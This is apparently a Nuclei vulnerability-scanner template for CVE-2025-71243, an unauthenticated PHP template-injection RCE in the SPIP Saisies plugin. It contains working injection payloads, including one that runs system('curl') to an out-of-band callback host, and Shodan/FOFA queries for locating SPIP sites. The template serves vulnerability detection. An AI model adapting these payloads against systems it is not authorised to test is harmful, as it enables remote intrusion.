id: vt-2025-71243

info:
  name: SPIP Saisies Plugin - Unauthenticated RCE
  author: omarkurt
  severity: critical
  description: |
    The Saisies plugin for SPIP versions 5.4.0 through 5.11.0 allows unauthenticated
    Remote Code Execution via PHP template injection in the _anciennes_valeurs parameter.
    The parameter bypasses protege_champ() sanitization due to underscore prefix, and
    #ACTION_FORMULAIRE renders with interdire_scripts=false, allowing PHP code execution.
  reference:
    - https://vulnerability.circl.lu/vuln/cve-2025-71243
    - https://chocapikk.com/posts/2026/spip-saisies-rce/
    - https://github.com/Chocapikk/CVE-2025-71243
    - https://vulnerabletarget.com/VT-2025-71243
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-71243
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 3
    vendor: spip
    product: saisies
    shodan-query: 'http.html:"SPIP"'
    fofa-query: 'app="SPIP"'
  tags: cve,cve2025,spip,saisies,rce,code-injection,unauth,oast,oob,interactsh

variables:
  rce_payload: "x'/><?php echo 'VT2025SPIPSAISIES'; ?><input value='x"
  oob_payload: "x'/><?php gethostbyname('{{interactsh-url}}'); ?><input value='x"
  oob_curl: "x'/><?php system('curl+-s+{{interactsh-url}}'); ?><input value='x"

flow: http(1) || http(2) || http(3)

http:
  # In-band detection via GET
  - method: GET
    path:
      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(rce_payload)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "VT2025SPIPSAISIES"

      - type: status
        status:
          - 200

  # Out-of-band detection via DNS
  - method: GET
    path:
      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_payload)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200

    extractors:
      - type: dsl
        dsl:
          - "'DNS OOB interaction received from ' + interactsh_request"

  # Out-of-band detection via HTTP
  - method: GET
    path:
      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_curl)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: dsl
        dsl:
          - "'OOB RCE confirmed via ' + interactsh_protocol"
